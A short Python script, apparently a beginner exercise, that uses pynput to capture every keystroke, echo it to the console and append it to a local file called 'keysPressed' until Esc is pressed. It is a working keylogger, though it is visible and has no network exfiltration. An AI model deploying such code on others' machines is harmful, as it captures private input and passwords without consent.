from pynput import keyboard

def on_press(key):

    try:
        if key.char:
            print(f"Key {key.char} pressed")
            with open('keysPressed', 'a') as k:
                k.write(key.char)

    except AttributeError:
        if key==keyboard.Key.space:
            print(f'space key pressed')
            with open('keysPressed', 'a') as space:
                space.write(' ')
        elif key==keyboard.Key.enter:
            print("Enter key pressed")
            with open('keysPressed', 'a') as file:
                file.write("\n")
        else:
            print(f' special key pressed {key}')

    if key == keyboard.Key.esc:
        print("Exiting program...")
        return False


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
